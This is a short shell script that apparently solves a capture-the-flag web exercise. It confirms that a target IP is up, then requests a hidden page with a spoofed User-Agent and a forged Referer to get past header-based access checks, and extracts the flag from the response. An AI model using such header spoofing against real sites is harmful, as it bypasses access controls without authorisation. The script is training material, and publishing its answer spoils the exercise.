#!/bin/sh
if [ "$#" -ne 1 ]; then
	echo "Usage: ./script.sh <ip>"
	exit 1
else
	ip=$1
fi

echo "Testing the IP address..."
response=$(curl -s -o /dev/null -w "%{http_code}" http://$ip)

if [ $response -eq 200 ]; then
	echo "The IP address responded successfully with HTTP status code 200."
	echo "Extracting the flag..."
	flag=$(curl -s -A "ft_bornToSec" -e "https://www.nsa.gov/" "http://$ip/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" | grep -oP '(?<=The flag is : ).*?(?=</h2>)')
	
	if [ -n "$flag" ]; then
		echo "The flag is: $flag"
	else
		echo "Failed to extract the flag."
	fi
else
	echo "Failed to connect. HTTP status code: $response"
fi